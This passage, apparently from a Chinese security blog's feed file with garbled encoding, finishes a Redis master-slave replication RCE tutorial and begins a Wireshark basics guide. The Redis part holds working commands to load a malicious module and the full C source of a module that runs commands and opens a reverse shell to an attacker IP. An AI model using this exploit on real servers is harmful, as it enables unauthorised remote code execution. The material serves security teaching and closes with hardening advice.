è¾“æ–¹å¼ä¸ºå…¨é‡ä¼ è¾“</li><li>ç¬¬å››æ­¥ï¼ŒåŠ è½½æ¶æ„soæ–‡ä»¶ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</li></ul><blockquote><p>æˆ‘ä»¬éœ€è¦å°†redis-rogue-serverçš„exp.soå¤åˆ¶åˆ°Awsome-Redis-Rogue-Serverçš„ç›®å½•ä¸‹è¿›è¡Œä½¿ç”¨ï¼Œå› ä¸ºä»–çš„exp.soæ˜¯å¸¦systemæ¨¡å—çš„</p><p><img src="http://cdn.clown2024.cn/202407151705669.png" alt="image-20240330230929601"></p></blockquote><p>æ”»å‡»æœºå…ˆæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ä¼ªé€ ä¸€ä¸ªmaster</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 redis_rogue_server.py -v -path exp.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705670.png" alt="image-20240330232215843"></p><p>æˆ‘ä»¬è¿æ¥ä¸Šå—å®³è€…æœºå™¨ä¹‹åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ä¿®æ”¹ä¸€ä¸‹æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /tmp #ä¸€èˆ¬/tmpç›®å½•éƒ½æœ‰æƒé™å†™å…¥ï¼Œæ‰€ä»¥é€‰æ‹©è¿™ä¸ªç›®å½•å†™å…¥<br>config set dbfilename exp.so  #è®¾ç½®å¯¼å‡ºæ–‡ä»¶å<br>slaveof &lt;æˆ‘ä»¬ä¼ªé€ çš„ä¸»æœºmasterçš„ip&gt; &lt;ç«¯å£å·&gt; #è¿›è¡Œä¸»ä»åŒæ­¥ï¼Œå°†æ¶æ„soæ–‡ä»¶å†™å…¥åˆ°tmpç›®å½•<br>module load ./exp.so   #åŠ è½½å†™å…¥çš„æ¶æ„soæ–‡ä»¶æ¨¡å—<br>module list            #æŸ¥çœ‹æ¶æ„soæœ‰æ²¡æœ‰åŠ è½½æˆåŠŸï¼Œä¸»è¦çœ‹æœ‰æ²¡æœ‰systemæ¨¡å—<br>system.rev &lt;æ”»å‡»è€…ip&gt; &lt;ç›‘å¬ç«¯å£&gt;   #è¿™æ ·å°±å¯ä»¥åå¼¹ä¸€ä¸ªshellå›æ¥äº†<br></code></pre></td></tr></table></figure><p>å¯ä»¥å…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬åŒæ­¥ä¹‹å‰æ˜¯æ²¡æœ‰æ¨¡å—çš„</p><p><img src="http://cdn.clown2024.cn/202407151705671.png" alt="image-20240330232527628"></p><p>æˆ‘ä»¬åŒæ­¥ä¹‹åå†çœ‹ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151705672.png" alt="image-20240330233258551"></p><p>æœ€åç›‘å¬ç«¯å£è¿›è¡Œåå¼¹shell</p><p><img src="http://cdn.clown2024.cn/202407151705673.png" alt="image-20240330233419607"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å½“å‰ç›®å½•å°±æ˜¯åœ¨&#x2F;tmpä¸‹</p><h2 id="äº†è§£ä¸€ä¸‹å¤–éƒ¨æ¨¡å—åŸç†"><a href="#äº†è§£ä¸€ä¸‹å¤–éƒ¨æ¨¡å—åŸç†" class="headerlink" title="äº†è§£ä¸€ä¸‹å¤–éƒ¨æ¨¡å—åŸç†"></a>äº†è§£ä¸€ä¸‹å¤–éƒ¨æ¨¡å—åŸç†</h2><p>å¤§æ¦‚è¯´ä¸€ä¸‹æ¨¡å—ç¼–å†™çš„å®ç°æµç¨‹ï¼š</p><blockquote><p>é¦–å…ˆéœ€è¦çš„æ˜¯åˆå§‹åŒ–ï¼Œä»¥ä¾¿è®©æ¡†æ¶å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„æ–¹æ³•ï¼Œè¿™å°±éœ€è¦è¿›è¡Œæ³¨å†Œï¼ŒRedisé€šè¿‡RedisModule_Initæ–¹æ³•è¿›è¡Œæ³¨å†Œæ¨¡å—ï¼Œå’ŒRedisModule_CreateCommandæ³¨å†Œè‡ªå®šä¹‰æ–¹æ³•ã€‚</p><p>Rediså¯¼å‡ºäº†redismodule.hå¤´æ–‡ä»¶ï¼Œé€šè¿‡å®ç°è¯¥å¤´æ–‡ä»¶ç›¸å…³APIå‡½æ•°ï¼Œç„¶åç¼–è¯‘ä¸ºsoåŠ¨æ€åº“å³å¯ï¼Œå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨loadmoduleæŒ‡æ˜ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶ä½¿ç”¨å‘½ä»¤åŠ¨æ€åŠ è½½ï¼ˆMODULE LOADï¼‰ã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ä¸Šé¢ç»™æˆ‘ä»¬çš„å·¥å…·é‡Œçš„exp.soï¼Œä»–å°±æ˜¯ç”±ä¸€ä¸ªexp.cç¼–è¯‘è€Œæ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹é‡Œé¢çš„å†…å®¹</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;redismodule.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">DoCommand</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>        <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-type">size_t</span> cmd_len;<br>                <span class="hljs-type">size_t</span> size = <span class="hljs-number">1024</span>;<br>                <span class="hljs-type">char</span> *cmd = RedisModule_StringPtrLen(argv[<span class="hljs-number">1</span>], &amp;cmd_len);<br><br>                FILE *fp = popen(cmd, <span class="hljs-string">&quot;r&quot;</span>);<br>                <span class="hljs-type">char</span> *buf, *output;<br>                buf = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>                output = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>                <span class="hljs-keyword">while</span> ( fgets(buf, <span class="hljs-keyword">sizeof</span>(buf), fp) != <span class="hljs-number">0</span> ) &#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) + <span class="hljs-built_in">strlen</span>(output) &gt;= size) &#123;<br>                                output = <span class="hljs-built_in">realloc</span>(output, size&lt;&lt;<span class="hljs-number">2</span>);<br>                                size &lt;&lt;= <span class="hljs-number">1</span>;<br>                        &#125;<br>                        <span class="hljs-built_in">strcat</span>(output, buf);<br>                &#125;<br>                RedisModuleString *ret = RedisModule_CreateString(ctx, output, <span class="hljs-built_in">strlen</span>(output));<br>                RedisModule_ReplyWithString(ctx, ret);<br>                pclose(fp);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> RedisModule_WrongArity(ctx);<br>        &#125;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">RevShellCommand</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>        <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">3</span>) &#123;<br>                <span class="hljs-type">size_t</span> cmd_len;<br>                <span class="hljs-type">char</span> *ip = RedisModule_StringPtrLen(argv[<span class="hljs-number">1</span>], &amp;cmd_len);<br>                <span class="hljs-type">char</span> *port_s = RedisModule_StringPtrLen(argv[<span class="hljs-number">2</span>], &amp;cmd_len);<br>                <span class="hljs-type">int</span> port = atoi(port_s);<br>                <span class="hljs-type">int</span> s;<br><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sa</span>;</span><br>                sa.sin_family = AF_INET;<br>                sa.sin_addr.s_addr = inet_addr(ip);<br>                sa.sin_port = htons(port);<br><br>                s = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>                connect(s, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;sa, <span class="hljs-keyword">sizeof</span>(sa));<br>                dup2(s, <span class="hljs-number">0</span>);<br>                dup2(s, <span class="hljs-number">1</span>);<br>                dup2(s, <span class="hljs-number">2</span>);<br><br>                execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> RedisModule_WrongArity(ctx);<br>        &#125;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">RedisModule_OnLoad</span><span class="hljs-params">(RedisModuleCtx *ctx, RedisModuleString **argv, <span class="hljs-type">int</span> argc)</span> &#123;<br>    <span class="hljs-keyword">if</span> (RedisModule_Init(ctx,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-number">1</span>,REDISMODULE_APIVER_1)<br>        == REDISMODULE_ERR) <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br><br>    <span class="hljs-keyword">if</span> (RedisModule_CreateCommand(ctx, <span class="hljs-string">&quot;system.exec&quot;</span>,<br>        DoCommand, <span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) == REDISMODULE_ERR)<br>        <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br>        <span class="hljs-keyword">if</span> (RedisModule_CreateCommand(ctx, <span class="hljs-string">&quot;system.rev&quot;</span>,<br>        RevShellCommand, <span class="hljs-string">&quot;readonly&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) == REDISMODULE_ERR)<br>        <span class="hljs-keyword">return</span> REDISMODULE_ERR;<br>    <span class="hljs-keyword">return</span> REDISMODULE_OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>**#include â€œredismodule.hâ€**è¿™é‡Œå°±æ˜¯å¼•å…¥äº†è¿™ä¸ªå¤´æ–‡ä»¶ç„¶åå®ç°äº†å…¶ä¸­çš„APIæ¥å®šä¹‰è‡ªå®šä¹‰çš„æ¨¡å—ï¼Œè¿™ä¸ªå¤´æ–‡ä»¶å¯ä»¥ä»å®˜æ–¹ä»“åº“æºç ä¸­æ‰¾åˆ°ï¼Œé‡Œé¢çš„å†…å®¹å°±ä¸çœ‹äº†ï¼Œä¸»è¦æ¥çœ‹æ¯ä¸ªæ¨¡å—æ˜¯æ€ä¹ˆç¼–å†™çš„</p><blockquote><p>ä¸Šé¢æœ‰ä¸‰ä¸ªå‡½æ•°RedisModule_OnLoadï¼ŒRevShellCommandï¼ŒDoCommand</p><p>RevShellCommandï¼šè¯¥å‡½æ•°æ˜¯ <code>system.rev</code> å‘½ä»¤çš„å®ç°ã€‚å½“ä¼ å…¥çš„å‚æ•°ä¸ªæ•°ä¸º3æ—¶ï¼Œå®ƒä¼šè·å–ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºIPåœ°å€ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä½œä¸ºç«¯å£å·ã€‚ç„¶åï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼Œå¹¶è¿æ¥åˆ°æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ã€‚æ¥ä¸‹æ¥ï¼Œå®ƒå°†æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œå¹¶æ‰§è¡Œ <code>/bin/sh</code>ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªåå‘ shellã€‚</p><p>DoCommandï¼šè¯¥å‡½æ•°æ˜¯ <code>system.exec</code> å‘½ä»¤çš„å®ç°ã€‚å½“ä¼ å…¥çš„å‚æ•°ä¸ªæ•°ä¸º2æ—¶ï¼Œå®ƒä¼šè·å–ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºå‘½ä»¤å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ <code>popen</code> å‡½æ•°æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œè·å–å‘½ä»¤çš„è¾“å‡ºã€‚ç„¶åï¼Œå®ƒå°†å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²å›å¤ç»™å®¢æˆ·ç«¯ã€‚</p><p>RedisModule_OnLoadï¼šè¯¥å‡½æ•°æ˜¯æ¨¡å—åŠ è½½å‡½æ•°ã€‚åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæ¨¡å—è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œå¹¶åˆ›å»ºäº†ä¸¤ä¸ªå‘½ä»¤ï¼š<code>system.exec</code> å’Œ <code>system.rev</code>ã€‚è¿™äº›å‘½ä»¤åˆ†åˆ«ä¸å¯¹åº”çš„å¤„ç†å‡½æ•° <code>DoCommand</code> å’Œ <code>RevShellCommand</code> å…³è”èµ·æ¥ã€‚è¿™æ ·ï¼Œå½“å®¢æˆ·ç«¯åœ¨Redisä¸­æ‰§è¡Œè¿™äº›å‘½ä»¤æ—¶ï¼Œç›¸åº”çš„å¤„ç†å‡½æ•°å°†è¢«è°ƒç”¨ã€‚</p><p>RedisModule_Initï¼šè¯¥å‡½æ•°ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œä»¥åˆ›å»ºsystem.execä¸ºä¾‹ï¼Œå®ƒæ¥å—ä¸ƒä¸ªå‚æ•°ï¼š<code>ctx</code> æ˜¯Redisæ¨¡å—ä¸Šä¸‹æ–‡æŒ‡é’ˆï¼Œâ€system.execâ€ æ˜¯å‘½ä»¤çš„åç§°ï¼Œ<code>DoCommand</code> æ˜¯å¤„ç†è¯¥å‘½ä»¤çš„å‡½æ•°æŒ‡é’ˆï¼Œâ€readonlyâ€ æ˜¯å‘½ä»¤çš„æ ‡è¯†ç¬¦ï¼Œ1 æ˜¯å‘½ä»¤çš„é”®å’Œå‚æ•°çš„ä¸ªæ•°ï¼Œ1 æ˜¯å‘½ä»¤çš„åå­—å’Œå‚æ•°çš„ä¸ªæ•°ï¼Œ1 æ˜¯å‘½ä»¤çš„å¤æ‚åº¦ã€‚å¦‚æœå‘½ä»¤åˆ›å»ºå¤±è´¥ï¼Œå‡½æ•°å°†è¿”å› <code>REDISMODULE_ERR</code>ã€‚</p></blockquote><h1 id="å®‰å…¨é˜²æŠ¤"><a href="#å®‰å…¨é˜²æŠ¤" class="headerlink" title="å®‰å…¨é˜²æŠ¤"></a>å®‰å…¨é˜²æŠ¤</h1><p>redisçš„å®‰å…¨è®¾ç½®ï¼šè®¾ç½®å®Œæ¯•ï¼Œéœ€è¦é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶å¯åŠ¨redisã€‚</p><ol><li>ç»‘å®šå†…ç½‘ip</li><li>requirepassè®¾ç½®rediså¯†ç </li><li>å¼€å¯ä¿æŠ¤æ¨¡å¼(protected-mode)</li><li>æœ€å¥½æ›´æ”¹ä¸€ä¸‹é»˜è®¤ç«¯å£</li><li>å•ç‹¬ä¸ºredisè®¾ç½®ä¸€ä¸ªæ™®é€šè´¦å·ï¼Œå¯åŠ¨redis</li></ol>]]></content>
      
      
      <categories>
          
          <category> webæ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµé‡åˆ†æå­¦ä¹ </title>
      <link href="/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="wiresharkçš„åŸºæœ¬ä½¿ç”¨"><a href="#Wiresharkçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="Wiresharkçš„åŸºæœ¬ä½¿ç”¨"></a>Wiresharkçš„åŸºæœ¬ä½¿ç”¨</h1><h2 id="åŸºæœ¬ç•Œé¢ä»‹ç»"><a href="#åŸºæœ¬ç•Œé¢ä»‹ç»" class="headerlink" title="åŸºæœ¬ç•Œé¢ä»‹ç»"></a>åŸºæœ¬ç•Œé¢ä»‹ç»</h2><p>ç‚¹è¿›å»å°±æ˜¯wiresharkçš„ä¸»ç•Œé¢ï¼ŒåŒ…å«ä¸»æœºä¸Šå­˜åœ¨çš„æµé‡æ–‡ä»¶å’Œç”¨äºæ•è·æµé‡çš„ç½‘å¡</p><p><img src="http://cdn.clown2024.cn/202407151450139.png" alt="image-20240329215038242"></p><p><strong>å·¥ä½œç•Œé¢</strong></p><p>è¿™é‡Œé€‰ç”¨äº†ä»¥å¤ªç½‘ç½‘å¡æ•è·äº†ä¸€äº›æµé‡è¿›è¡Œæ¼”ç¤º</p><p><img src="http://cdn.clown2024.cn/202407151450140.png" alt="image-20240329215342258"></p><p><strong>ä¸€äº›èœå•æ </strong></p><ol><li><p>æ–‡ä»¶èœå•</p><p>æ–‡ä»¶èœå•ä¸»è¦è´Ÿè´£æ‰“å¼€å·²ç»æŠ“å–çš„æ•°æ®åŒ…ã€æœ€è¿‘æ‰“å¼€çš„æ•°æ®åŒ…åˆå¹¶æ•°æ®åŒ…ã€å¯¼å…¥å¯¼å‡ºç‰¹å®šæ•°æ®åŒ…ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450141.png" alt="image-20240329215454613"></p></li><li><p>ç¼–è¾‘èœå•</p><p>ç¼–è¾‘èœå•ä¸»è¦è´Ÿè´£å¯¹æ•°æ®åŒ…åˆ†ç±»æ ‡è®°ï¼Œä»¥åŠåœ¨æŠ“åŒ…è¿‡ç¨‹ä¸­æŒ‰ç…§æ—¶é—´å¤§å°è¿›è¡Œåˆ†åŒ…å­˜å‚¨ï¼Œè¿˜æœ‰æ•´ä¸ªè½¯ä»¶çš„é¦–é€‰é¡¹ä¹Ÿåœ¨ç¼–è¾‘èœå•ä¸­ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450142.png" alt="image-20240329215539889"></p></li><li><p>æ•è·èœå•</p><p>æ•è·èœå•ç”¨äºè®¾ç½®æ•è·è§„åˆ™ï¼Œå…¶ä¸­é€‰é¡¹èœå•å¯ä»¥è®¾ç½®æ•è·çš„ç½‘å¡ï¼Œè¿˜å¯ä»¥è®¾ç½®æ•è·è§„åˆ™</p><p><img src="http://cdn.clown2024.cn/202407151450143.png" alt="image-20240329215720951"></p></li><li><p>åˆ†æèœå•</p><p>åˆ†æèœå•é’ˆå¯¹å·²ç»è·å–çš„æ•°æ®åŒ…è¿›è¡Œåˆ†æï¼Œé€šè¿‡åˆ¶å®šç›¸åº”çš„è§„åˆ™ç­›åˆ†æ•°æ®åŒ…ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450144.png" alt="image-20240329215812146"></p></li><li><p>è§†å›¾èœå•</p><p>è§†å›¾èœå•ä¸»è¦æ˜¯é’ˆå¯¹è½¯ä»¶ä¸­çš„è§†å›¾æ˜¾ç¤ºè¿›è¡Œè®¾ç½®ï¼Œé‡ç‚¹éœ€è¦å…³æ³¨çš„æ˜¯è§£æåç§°ã€åˆ—æ˜¾ç¤ºä¸­çš„ç€è‰²è§„åˆ™ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450145.png" alt="image-20240329215931362"></p></li><li><p>ç»Ÿè®¡èœå•</p><p>ç»Ÿè®¡èœå•å¯ä»¥é€šè¿‡å¯¹å·²æœ‰æ•°æ®è¿›è¡Œå›¾å½¢åŒ–æ•°æ®åˆ†æï¼Œè¿™ä¸ªåŠŸèƒ½å¯¹äºåˆ†æå¤§é‡æ•°æ®æ˜¯éå¸¸æœ‰å¸®åŠ©çš„ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151450146.png" alt="image-20240329220025304"></p></li></ol><h2 id="æ•°æ®åŒ…æ˜¾ç¤ºç›¸å…³"><a href="#æ•°æ®åŒ…æ˜¾ç¤ºç›¸å…³" class="headerlink" title="æ•°æ®åŒ…æ˜¾ç¤ºç›¸å…³"></a>æ•°æ®åŒ…æ˜¾ç¤ºç›¸å…³</h2><p><strong>æ•°æ®åŒ…æ˜¾ç¤ºåˆ—ä¿¡æ¯</strong></p><p><img src="http://cdn.clown2024.cn/202407151450147.png" alt="image-20240329220327142"></p><ol><li>Noï¼šç¼–å·ï¼Œæ ¹æ®æŠ“å–çš„æ•°æ®åŒ…è‡ªåŠ¨åˆ†é…</li><li>Timeï¼šæ—¶é—´ï¼Œæ ¹æ®æ•è·æ—¶é—´è®¾å®šè¯¥åˆ—</li><li>Sourceï¼šæºåœ°å€ä¿¡æ¯ï¼Œå¦‚æœæ•°æ®åŒ…åŒ…å«æºåœ°å€ä¿¡æ¯æ¯”å¦‚ï¼šIPã€MACç­‰ï¼Œä¼šæ˜¾ç¤ºåœ¨è¯¥åˆ—ä¸­</li><li>Destinationï¼šç›®çš„åœ°å€ä¿¡æ¯</li><li>Protocolï¼šåè®®ä¿¡æ¯</li><li>Lengthï¼šæ•°æ®åŒ…é•¿åº¦ä¿¡æ¯</li><li>Infoï¼šwiresharkå¯¹æ•°æ®åŒ…è§£è¯»çš„ä¿¡æ¯</li></ol><p><strong>ä¿®æ”¹æ˜¾ç¤ºåˆ—ä¿¡æ¯</strong></p><p>æˆ‘ä»¬å¯ä»¥é€‰æ‹©æƒ³è¦åŠ å…¥æ˜¾ç¤ºåˆ—çš„å­é¡¹å³å‡»å¹¶é€‰æ‹©åº”ç”¨ä¸ºåˆ—ï¼Œå°±å¯ä»¥åœ¨ä¸Šé¢çœ‹åˆ°è¯¥åˆ—</p><p><img src="http://cdn.clown2024.cn/202407151450148.png" alt="image-20240329220847712"></p><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ é™¤å·²å­˜åœ¨çš„æ˜¾ç¤ºåˆ—</p><p>æˆ‘ä»¬è¿˜å¯ä»¥å³å‡»ç¼–è¾‘åˆ—ä¿¡æ¯</p><p><img src="http://cdn.clown2024.cn/202407151450149.png" alt="image-20240329221320578"></p><p><strong>ä¿®æ”¹æ˜¾ç¤ºåˆ—æ—¶é—´</strong></p><p>é»˜è®¤ç»™å‡ºçš„æ—¶é—´æ ¼å¼ä¸å¥½é˜…è¯»ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±è¿›è¡Œä¿®æ”¹</p><p>æˆ‘ä»¬å¯ä»¥å•å‡»è§†å›¾é€‰æ‹©æƒ³è¦çš„æ—¶é—´æ ¼å¼</p><p><img src="http://cdn.clown2024.cn/202407151450150.png" alt="image-20240329221446446"></p><p><strong>åå­—è§£æ</strong></p><p>é»˜è®¤æƒ…å†µä¸‹Wiresharkåªå¼€å¯äº†macåœ°å€è§£æï¼Œå¦‚æœæœ‰éœ€è¦æˆ‘ä»¬å¯ä»¥å¼€å¯è§£æç½‘ç»œåç§°ã€è§£æä¼ è¾“å±‚åç§°ã€‚</p><p>ç‚¹å‡»æ•è·ï¼Œåœ¨æ•è·é€‰é¡¹ä¸­è¿›è¡Œä¿®æ”¹ï¼Œæ¯”å¦‚ä¼ è¾“å±‚å°±ä¼šå°†èƒ½è¯†åˆ«çš„ç«¯å£å·è§£ææˆå¯¹åº”çš„æœåŠ¡åç§°ï¼Œè§£æä¸äº†å°±æ˜¾ç¤ºåŸå§‹ç«¯å£å·</p><p><img src="http://cdn.clown2024.cn/202407151450151.png" alt="image-20240329221847219"></p><h2 id="æ•°æ®åŒ…æ“ä½œ"><a href="#æ•°æ®åŒ…æ“ä½œ" class="headerlink" title="æ•°æ®åŒ…æ“ä½œ"></a>æ•°æ®åŒ…æ“ä½œ</h2><p>è·å–æ•°æ®åŒ…åç”¨æˆ·å¯ä»¥å¯¹å…¶è¿›è¡Œæ ‡è®°ã€æ³¨é‡Šã€åˆå¹¶ã€æ‰“å°ä»¥åŠå¯¼å‡ºç­‰æ“ä½œï¼Œè¿™é‡Œè®°å½•ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„æ“ä½œ</p><ol><li><p>æ ‡è®°æ•°æ®åŒ…</p><p>æ ‡è®°æ•°æ®åŒ…å¯ä»¥å®ç°å¯¹æ¯”è¾ƒé‡è¦çš„æ•°æ®åŒ…è¿›è¡Œæ ‡è®°ï¼ŒåŒæ—¶è¿˜å¯ä»¥ä¿®æ”¹æ•°æ®åŒ…æ˜¾ç¤ºé¢œè‰²ã€‚æ ‡è®°æ•°æ®åŒ…çš„æ“ä½œæ­¥éª¤å¦‚ä¸‹:</p><p>åœ¨éœ€è¦æ ‡è®°çš„æ•°æ®åŒ…å³å‡»é€‰æ‹©â€œæ ‡è®°&#x2F;å–æ¶ˆæ ‡è®°â€</p><p><img src="http://cdn.clown2024.cn/202407151450152.png" alt="image-20240329222938030"></p><p>æ ‡è®°ä¹‹åæ•°æ®åŒ…å°±ä¼šé«˜äº®æ˜¾ç¤º</p></li><li><p>æ·»åŠ æ³¨é‡Šæ“ä½œ</p><p>Wiresharkæä¾›å¯¹æ•°æ®åŒ…æ³¨é‡Šçš„åŠŸèƒ½ï¼Œåœ¨å®é™…æ“ä½œä¸­å¦‚æœæ„Ÿè§‰è¿™ä¸ªæ•°æ®åŒ…æœ‰é—®é¢˜æˆ–è€…æ¯”è¾ƒé‡è¦ï¼Œå¯ä»¥æ·»åŠ ä¸€æ®µæ³¨é‡Šä¿¡æ¯</p><p>å³å‡»éœ€è¦æ³¨é‡Šçš„æ•°æ®åŒ…é€‰æ‹©â€åˆ†ç»„æ³¨é‡Šâ€</p><p><img src="http://cdn.clown2024.cn/202407151450153.png" alt="image-20240329223334679"></p><p><img src="http://cdn.clown2024.cn/202407151450154.png" alt="image-20240329223413212"></p></li><li><p>æ‰“å°æ•°æ®åŒ…</p><p>ç‚¹å‡»æ–‡ä»¶èœå•é€‰æ‹©æ‰“å°</p><p><img src="http://cdn.clown2024.cn/202407151450155.png" alt="image-20240329224124850"></p></li><li><p>åˆå¹¶æ•°æ®åŒ…</p><p>åœ¨å®é™…æŠ“åŒ…è¿‡ç¨‹ä¸­ï¼Œå¦‚æœç½‘ç»œæµé‡æ¯”è¾ƒå¤§ï¼Œä¸åœæ­¢æŠ“åŒ…æ“ä½œï¼Œå¯èƒ½ä¼šå‡ºç°æŠ“åŒ…å·¥å…·æ¶ˆè€—æ‰æ‰€æœ‰å†…å­˜ï¼Œæœ€ç»ˆå¯¼è‡´ç³»ç»Ÿå´©æºƒçš„çŠ¶æ€ã€‚ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œç”¨æˆ·å¯ä»¥é‡‡å–åˆ†æ®µæŠ“å–ï¼Œç”Ÿæˆå¤šä¸ªæ•°æ®åŒ…æ–‡ä»¶ï¼Œæœ€åä¸ºäº†æ•´ä½“åˆ†æï¼Œå†å°†è¿™äº›åˆ†æ®µæ•°æ®åŒ…åˆå¹¶æˆä¸€ä¸ªåŒ…ã€‚</p><p>ç‚¹å‡»æ–‡ä»¶èœå•é€‰æ‹©åˆå¹¶ï¼Œç„¶åé€‰æ‹©è¦åˆå¹¶çš„æµé‡æ–‡ä»¶å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151450156.png" alt="image-20240329223855934"></p></li><li><p>å¯¼å‡ºæ•°æ®åŒ…</p><p>Wiresharkæä¾›äº†æ•°æ®åŒ…å¯¼å‡ºåŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥è¿›è¡Œç­›é€‰å¯¼å‡ºï¼Œè¿˜å¯ä»¥é€šè¿‡åˆ†ç±»å¯¼å‡ºï¼Œè¿˜å¯ä»¥åªå¯¼å‡ºé€‰ä¸­æ•°æ®åŒ…</p><p>ç‚¹å‡»æ–‡ä»¶èœå•é€‰æ‹©å¯¼å‡ºç‰¹å®šåˆ†ç»„</p><p><img src="http://cdn.clown2024.cn/202407151450157.png" alt="image-20240329224400060"></p><p>è¿˜å¯ä»¥é€‰æ‹©å¯¼å‡ºä¸ºä¸åŒæ ¼å¼</p></li></ol><h2 id="æ•è·é€‰é¡¹"><a href="#æ•è·é€‰é¡¹" class="headerlink" 